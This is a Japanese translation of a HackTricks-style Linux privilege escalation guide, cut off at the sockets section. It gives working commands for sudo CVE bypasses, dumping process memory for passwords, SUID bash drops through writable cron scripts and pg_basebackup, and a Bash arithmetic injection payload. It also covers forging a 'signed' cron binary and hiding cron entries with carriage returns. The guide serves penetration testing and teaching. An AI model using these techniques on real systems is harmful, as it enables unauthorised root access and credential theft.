# Linux権限昇格

{{#include ../../../banners/hacktricks-training.md}}

## システム情報

### OS情報

実行中のOSについて情報収集を始めます
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

`PATH`変数内のいずれかのフォルダに**書き込み権限がある**場合、一部のライブラリやバイナリをhijackできる可能性があります：
```bash
echo $PATH
```
### 環境情報

環境変数に興味深い情報、パスワード、または API キーはありますか？
```bash
(env || set) 2>/dev/null
```
### カーネルエクスプロイト

カーネルのバージョンを確認し、権限昇格に利用できるエクスプロイトが存在するか確認します。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
脆弱な kernel のリストと、すでに **compiled exploits** がまとめられている場所は、こちらで確認できます：[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) および [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)。\
その他に **compiled exploits** を入手できるサイト：[https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries)、[https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

その web から脆弱な kernel バージョンをすべて抽出するには、次のように実行します：
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploit の検索に役立つ Tools:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim 上で実行、kernel 2.x の exploit のみチェック)

常に **kernel version を Google で検索**してください。kernel version が kernel exploit の中に記載されている可能性があり、その exploit が有効であることを確認できます。

Additional kernel exploitation techniques:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudoのバージョン

以下に示す脆弱なsudoのバージョンに基づくと：
```bash
searchsploit sudo
```
この grep を使用して、sudo のバージョンに脆弱性があるか確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1 より前の Sudo バージョン（**1.9.14 - 1.9.17 < 1.9.17p1**）では、`/etc/nsswitch.conf` ファイルがユーザー制御ディレクトリから使用される場合、権限のないローカルユーザーが sudo の `--chroot` オプションを介して root に privilege escalation できます。

この [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) は、その [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) を exploit するものです。exploit を実行する前に、使用している `sudo` のバージョンが vulnerable であり、`chroot` feature をサポートしていることを確認してください。

詳細については、元の [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) を参照してください。

### Sudo host-based rules bypass (CVE-2025-32462)

1.9.17p1 より前の Sudo（報告されている影響範囲: **1.8.8–1.9.17**）は、`sudo -h <host>` で指定された **user-supplied hostname** を使用して host-based sudoers rules を評価し、**real hostname** を使用しない場合があります。sudoers が別の host に対してより広範な権限を付与している場合、その host をローカルで **spoof** できます。

Requirements:
- Vulnerable sudo version
- Host-specific sudoers rules（host が現在の hostname または `ALL` のいずれでもないこと）

Example sudoers pattern:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
許可されたホストを spoofing して Exploit：
```bash
sudo -h devbox id
sudo -h devbox -i
```
spoofed name の名前解決がブロックされる場合は、`/etc/hosts` に追加するか、DNS lookup を回避するためにログや設定にすでに登場している hostname を使用します。

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg の署名検証に失敗

この vuln を exploit する方法の**例**については、**HTB の smasher2 box**を確認してください。
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらなるシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 考えられる防御策を列挙する

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

コンテナ内にいる場合は、まず以下の container-security セクションを確認し、その後 runtime 固有の abuse ページへ pivot します:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Drives

**何が mount され、unmount されているか**、またその場所と理由を確認します。何かが unmount されている場合は、それを mount して private info を確認できる可能性があります
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**コンパイラがインストールされているか確認**してください。これは、kernel exploit を使用する必要がある場合に役立ちます。使用するマシン上（または類似したマシン上）でコンパイルすることが推奨されるためです。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアのインストール

**インストールされているパッケージとサービスのバージョン**を確認します。権限昇格に悪用できる、古い Nagios のバージョンなどが存在する可能性があります…\
より疑わしいインストール済みソフトウェアのバージョンを手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
マシンへの SSH access がある場合、**openVAS** を使用して、マシン内にインストールされている outdated で vulnerable な software をチェックすることもできます。

> [!NOTE] > _これらの commands は、ほとんど役に立たない大量の information を表示するため、OpenVAS など、インストールされている software の version が既知の exploits に対して vulnerable かどうかをチェックする applications の使用が推奨されます_

## Processes

実行されている **processes** を確認し、いずれかの process が本来持つべき以上の **privileges** を持っていないかチェックします（例えば、root によって実行されている tomcat など）。
```bash
ps aux
ps -ef
top -n 1
```
常に実行中の [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) がないか確認してください。これを悪用して権限を昇格できる可能性があります。**Linpeas** は、プロセスのコマンドライン内にある `--inspect` パラメータを確認して、これらを検出します。\
また、**プロセスのバイナリに対する自分の権限**も確認してください。他のユーザーが使用するバイナリを上書きできる可能性があります。

### Cross-user parent-child chains

親プロセスとは**異なるユーザー**で実行されている子プロセスは、必ずしも malicious とは限りませんが、有用な **triage signal** です。一部の遷移は想定されたものです（`root` が service user を起動する場合や、login manager が session process を作成する場合など）。しかし、通常とは異なる chain から、wrapper、debug helper、persistence、または runtime の弱い trust boundary が明らかになることがあります。

簡易確認：
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
意外な chain を見つけた場合は、親プロセスのコマンドラインと、その動作に影響を与えるすべてのファイル（`config`、`EnvironmentFile`、helper scripts、working directory、書き込み可能な引数）を調査してください。実際の privesc path では、child 自体は writable ではなくても、**parent-controlled config** または helper chain が writable でした。

### Deleted executables and deleted-open files

Runtime artifacts は、**削除後も**アクセスできる場合があります。これは privilege escalation と、すでに機密ファイルを open しているプロセスからの証拠復元の両方に役立ちます。

Deleted executables を確認します：
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
`/proc/<PID>/exe` が `(deleted)` を指している場合、そのプロセスはメモリ上にある古いバイナリイメージを引き続き実行しています。これは調査すべき強い兆候です。理由は以下のとおりです。

- 削除された実行ファイルに興味深い文字列や認証情報が含まれている可能性がある
- 実行中のプロセスが、依然として有用なファイルディスクリプタを公開している可能性がある
- 特権バイナリが削除されている場合、最近の改ざんまたは痕跡消去の試みを示している可能性がある

削除されたまま open されているファイルをグローバルに収集します。
```bash
lsof +L1
```
興味深いディスクリプタを見つけた場合は、直接復元します:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
これは、プロセスが削除済みの secret、script、database export、または flag file をまだ開いている場合に、特に有用です。

### Process monitoring

[**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使用して、プロセスを監視できます。これは、頻繁に実行される脆弱なプロセスや、特定の要件が満たされたときに実行されるプロセスを特定するのに非常に役立ちます。

### Process memory

サーバー上の一部のサービスは、**credentials をメモリ内に平文で保存します**。\
通常、他のユーザーに属するプロセスのメモリを読み取るには **root 権限**が必要です。そのため、これは通常、すでに root になっていて、さらに credentials を探したい場合に役立ちます。\
ただし、**一般ユーザーであっても、自分が所有するプロセスのメモリは読み取れる**ことを覚えておいてください。

> [!WARNING]
> 現在、多くのマシンではデフォルトで **ptrace が許可されていない**ため、権限のないユーザーが所有する他のプロセスを dump できません。
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ ファイルは、ptrace のアクセス可能性を制御します。
>
> - **kernel.yama.ptrace_scope = 0**: 同じ uid である限り、すべてのプロセスを debug できます。これは ptrace が機能していた従来の方法です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみ debug できます。
> - **kernel.yama.ptrace_scope = 2**: CAP_SYS_PTRACE capability が必要なため、admin のみ ptrace を使用できます。
> - **kernel.yama.ptrace_scope = 3**: ptrace を使用してプロセスを trace できません。一度設定すると、再び ptrace を有効にするには reboot が必要です。

#### GDB

（例として）FTP service のメモリにアクセスできる場合、その Heap を取得して、内部から credentials を検索できます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

特定のプロセス ID に対して、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマッピングされているか**を示し、**各マッピング領域の権限**も表示します。**mem** 擬似ファイルは、**プロセスのメモリ自体を公開**します。**maps** ファイルから、**どのメモリ領域が読み取り可能か**と、そのオフセットがわかります。この情報を使用して、**mem ファイル内を seek し、読み取り可能なすべての領域を**ファイルにダンプします。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` は仮想メモリではなく、システムの**物理**メモリへのアクセスを提供します。カーネルの仮想アドレス空間には /dev/kmem を使用してアクセスできます。\
通常、`/dev/mem` は **root** と **kmem** グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### Linux 用 ProcDump

ProcDump は、Windows 用 Sysinternals スイートに含まれる従来の ProcDump ツールを Linux 向けに再構築したものです。[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) から入手できます。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをダンプするには、以下を使用できます。

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root の要件を手動で削除し、自分が所有するプロセスをダンプできます
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) の Script A.5 (root が必要)

### プロセスメモリからの認証情報

#### 手動例

authenticator process が実行中であることがわかった場合:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスをdumpし（プロセスのメモリをdumpするさまざまな方法については前のセクションを参照）、メモリ内の認証情報を検索できます。
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

このツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、**メモリから平文の認証情報を盗み出し**、一部の**よく知られたファイル**からも取得します。正常に動作させるには root 権限が必要です。

| 機能                                             | プロセス名           |
| ------------------------------------------------- | -------------------- |
| GDM パスワード（Kali Desktop、Debian Desktop）    | gdm-password         |
| Gnome Keyring（Ubuntu Desktop、ArchLinux Desktop） | gnome-keyring-daemon |
| LightDM（Ubuntu Desktop）                         | lightdm              |
| VSFTPd（アクティブな FTP 接続）                   | vsftpd               |
| Apache2（アクティブな HTTP Basic Auth セッション） | apache2              |
| OpenSSH（アクティブな SSH セッション - Sudo の使用） | sshd:                |

#### Regex の検索/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Web “Crontab UI” panel (alseambusher/crontab-ui) が root として実行され、loopback にのみ bind されている場合でも、SSH local port-forwarding 経由で到達し、privileged job を作成して escalation できます。

Typical chain
- loopback-only port（例: 127.0.0.1:8000）と Basic-Auth realm を `ss -ntlp` / `curl -v localhost:8000` で discover
- operational artifacts から credentials を発見:
- `zip -P <password>` を使用する backups/scripts
- `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."` を公開している systemd unit
- Tunnel と login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限の job を作成して直ちに実行（SUID shell を配置）:
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用する:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI を root として実行せず、専用ユーザーと最小限の権限で制限する
- localhost に bind し、さらに firewall/VPN でアクセスを制限する。パスワードを再利用しない
- unit files に secrets を埋め込まず、secret stores または root のみが読み取れる EnvironmentFile を使用する
- オンデマンドの job 実行に対する audit/logging を有効にする



スケジュールされた job に脆弱性がないか確認する。root によって実行される script を悪用できる可能性がある（wildcard vuln？root が使用するファイルを変更できるか？symlink を使用できるか？root が使用するディレクトリ内に特定のファイルを作成できるか？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
`run-parts` が使用されている場合、実際に実行される名前を確認します：
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
これにより、false positivesを回避できます。書き込み可能な periodic directory は、payloadのファイル名がローカルの `run-parts` ルールに一致する場合にのみ有用です。

### Cron path

例えば、_/etc/crontab_ 内には PATH を確認できます: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

（ユーザー "user" が /home/user に対する書き込み権限を持っている点に注目してください）

この crontab 内で、root user が path を設定せずにコマンドまたは script を実行しようとした場合。例えば: _\* \* \* \* root overwrite.sh_\
次の方法で root shell を取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### ワイルドカードを使用する Cron script（Wildcard Injection）

root によって実行される script のコマンド内に「**\***」が含まれている場合、これを exploit して予期しないこと（privesc など）を引き起こせる可能性があります。例:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**ワイルドカードの前にパスが付いている場合（**_**/some/path/\***_ **など）、脆弱ではありません（**_**./\***_ **でさえ脆弱ではありません）。**

ワイルドカードを exploit するその他の tricks については、以下のページを参照してください。


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### cron log parser における Bash arithmetic expansion injection

Bash は、((...))、$((...))、および let の arithmetic evaluation の前に、parameter expansion と command substitution を実行します。root 権限で動作する cron/parser が untrusted な log fields を読み込み、それらを arithmetic context に渡す場合、attacker は command substitution $(...) を inject できます。これにより、cron の実行時に root 権限で command が実行されます。

- 仕組み: Bash では、expansion は次の順序で実行されます。parameter/variable expansion、command substitution、arithmetic expansion、word splitting、pathname expansion。したがって、`$(/bin/bash -c 'id > /tmp/pwn')0` のような値は、最初に substitution されて command が実行され、その後、残った numeric な `0` が arithmetic に使用されるため、script は error なしで処理を継続できます。

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: parsed log に attacker-controlled text を書き込ませ、numeric-looking field に command substitution を含め、digit で終わるようにします。arithmetic を valid に保つため、command が stdout に出力しないようにするか、redirect します。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting と symlink

root が実行する cron script を **modify できる場合**、非常に簡単に shell を取得できます。
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root によって実行される script が、**あなたが完全にアクセスできるディレクトリ**を使用している場合、そのフォルダを削除し、**あなたが制御する script を配置した別のフォルダへのシンボリックリンク**を作成すると役立つ可能性があります。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### シンボリックリンクの検証と、より安全なファイル処理

パスを使用してファイルを読み書きする特権スクリプト／バイナリを確認する際は、リンクがどのように処理されるかを検証します。

- `stat()` はシンボリックリンクをたどり、リンク先の metadata を返します。
- `lstat()` はリンク自体の metadata を返します。
- `readlink -f` と `namei -l` は、最終的なリンク先の解決や、各パス構成要素の permissions の確認に役立ちます。
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
防御側/開発者向けに、symlink trick に対するより安全なパターンには以下があります。

- `O_EXCL` と `O_CREAT`: パスがすでに存在する場合は失敗する（攻撃者が事前に作成したリンク/ファイルをブロック）。
- `openat()`: 信頼できるディレクトリの file descriptor を基準に操作する。
- `mkstemp()`: secure permissions を使用して一時ファイルを atomic に作成する。

### writable payloads を持つ custom-signed cron binaries
Blue teams は、cron から実行されるバイナリについて、custom ELF section を dump し、vendor string を grep してから root として実行することで、バイナリに「sign」することがあります。そのバイナリが group-writable（例: `root:devs 770` が所有する `/opt/AV/periodic-checks/monitor`）で、さらに signing material を leak できる場合、section を forge して cron task を hijack できます。

1. `pspy` を使用して verification flow を capture します。Era では、root が `objcopy --dump-section .text_sig=text_sig_section.bin monitor` を実行し、その後に `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` を実行してから、ファイルを実行していました。
2. leak した key/config（`signing.zip` 由来）を使用して、期待される certificate を再作成します。
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. malicious replacement（例: SUID bash を配置する、SSH key を追加する）を build し、grep を通過するように certificate を `.text_sig` に embed します。
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. execute bits を維持したまま、scheduled binary を overwrite します。
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 次の cron run を待ちます。naive な signature check が成功すると、payload が root として実行されます。

### Frequent cron jobs

プロセスを monitor して、1、2、5 分ごとに実行されている process を探すことができます。これを利用して privilege を escalate できる可能性があります。

たとえば、**1 分間、0.1 秒ごとに monitor**し、**実行回数の少ない command 順に sort**して、最も多く実行された command を削除するには、次のようにします。
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**次も使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（起動するすべてのプロセスを監視して一覧表示します）。

### 攻撃者が設定した mode bits を保持する root backup（pg_basebackup）

root 所有の cron が、あなたが書き込み可能な database directory に対して `pg_basebackup`（または recursive copy）を実行する場合、**SUID/SGID binary** を配置できます。その binary は、同じ mode bits のまま **root:root** 所有として backup output に再コピーされます。

典型的な discovery flow（low-priv DB user として）:
- `pspy` を使用して、毎分次のようなコマンドを呼び出す root cron を見つけます: `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`
- source cluster（例: `/var/lib/postgresql/14/main`）にあなたが書き込み可能であること、および job 実行後に destination（`/opt/backups/current`）が root 所有になることを確認します。

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
これは、`pg_basebackup` が cluster をコピーする際にファイルモードビットを保持するためです。root によって実行されると、宛先ファイルは **root の所有権 + 攻撃者が選択した SUID/SGID** を継承します。権限を保持し、実行可能な場所に書き込む、同様の特権バックアップ／コピー routine には脆弱性があります。

### Invisible cron jobs

**改行文字を使わずに**コメントの後ろに **carriage return を置く**ことで、cronjob を作成できます。この cron job は正常に動作します。例（carriage return 文字に注意してください）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
この種のステルスエントリを検出するには、制御文字を表示できるツールで cron ファイルを調べます。
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込めるか確認してください。書き込める場合、サービスが**開始**、**再起動**、または**停止**されたときに **backdoor を実行**するように、ファイルを**変更できる可能性があります**（マシンが再起動されるまで待つ必要がある場合があります）。\
例えば、**`ExecStart=/tmp/script.sh`** を使って、.service ファイル内に backdoor を作成します。

### 書き込み可能なサービスバイナリ

サービスによって実行されるバイナリへの**書き込み権限**がある場合、それらを backdoor 用に変更できます。そうすると、サービスが再実行されたときに backdoor が実行されます。

### systemd PATH - 相対パス

次のコマンドで **systemd** が使用する PATH を確認できます。
```bash
systemctl show-environment
```
パス内のいずれかのフォルダに**書き込み**できる場合、**権限を昇格**できる可能性があります。次のような**サービス設定**ファイルで使用されている**相対パス**を探す必要があります。
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、書き込み可能な systemd PATH フォルダ内に、相対パスのバイナリと**同じ名前の** **実行可能**ファイルを作成します。サービスに脆弱なアクション（**Start**、**Stop**、**Reload**）の実行を要求すると、**backdoor**が実行されます（通常、権限のないユーザーはサービスを start/stop できませんが、`sudo -l`を使用できるか確認してください）。

**`man systemd.service`でサービスについて詳しく学べます。**

## **Timers**

**Timers**は、名前が`**.timer**`で終わる systemd unit ファイルで、`**.service**`ファイルまたはイベントを制御します。**Timers**は、カレンダー時刻イベントと単調時刻イベントを組み込みでサポートしており、非同期で実行できるため、cronの代替として使用できます。

次のコマンドですべての timers を列挙できます：
```bash
systemctl list-timers --all
```
### 書き込み可能な timer

timer を変更できる場合、systemd.unit の既存のユニット（`.service` や `.target` など）を実行させることができます。
```bash
Unit=backdoor.service
```
ドキュメントでは、Unit について次のように説明されています。

> このタイマーの経過時に activate する Unit。引数は Unit 名であり、サフィックスに ".timer" は付きません。指定されていない場合、この値は、サフィックスを除いてタイマーユニットと同じ名前を持つ service にデフォルトで設定されます。（上記を参照。）activate される Unit 名とタイマーユニットの Unit 名は、サフィックスを除いて同一になるように命名することが推奨されます。

したがって、この permission を abuse するには、次のことを行う必要があります。

- **書き込み可能な binary を実行している** systemd unit（`.service` など）を見つける
- **relative path を実行しており**、その **systemd PATH** に対する **書き込み権限**を持つ systemd unit を見つける（その executable になりすますため）

**`man systemd.timer` で timers の詳細を確認できます。**

### **Timer の有効化**

timer を有効化するには root 権限が必要で、次のコマンドを実行します：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
`/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` にシンボリックリンクを作成することで、**timer** が **activated** される点に注意してください。

## Sockets

Unix Domain Sockets (UDS) は、client-server モデル内で同一または異なるマシン上の **process communication** を可能にします。標準の Unix descriptor files を使用してコンピューター間通信を行い、`.socket` files を通じて設定されます。

Sockets は `.socket` files を使用して設定できます。

**`man systemd.socket` で sockets の詳細を確認できます。** この file 内では、いくつかの興味深いパラメーターを設定できます。

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらの options はそれぞれ異なりますが、socket が **どこで listen するかを示す**ために使用されます（AF_UNIX socket file の path、listen する IPv4/6 および/または port number など）。
- `Accept`: boolean argument を受け取ります。**true** の場合、**incoming connection ごとに service instance が spawn され**、connection socket のみが渡されます。**false** の場合、すべての listening sockets 自体が **started service unit に渡され**、すべての connections に対して service unit が 1 つだけ spawn されます。この value は datagram sockets と FIFOs では無視され、単一の service unit がすべての incoming traffic を無条件に処理します。**デフォルトは false** です。performance 上の理由から、新しい daemons は `Accept=no` に適した方法でのみ記述することが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1 つ以上の command lines を受け取り、それぞれ listening **sockets**/FIFOs が **created** および bound **される前**または**後に実行されます**。command line の最初の token は absolute filename でなければならず、その後に process の arguments が続きます。
- `ExecStopPre`, `ExecStopPost`: listening **sockets**/FIFOs がそれぞれ **closed** および removed **される前**または**後に実行される**追加の **commands** です。
- `Service`: **incoming traffic** 時に **activate** する **service** unit name を指定します。この setting は Accept=no の sockets でのみ許可されます。デフォルトでは socket と同じ name の service（suffix は置き換えられます）になります。ほとんどの場合、この option を使用する必要はありません。

### Writable .socket files

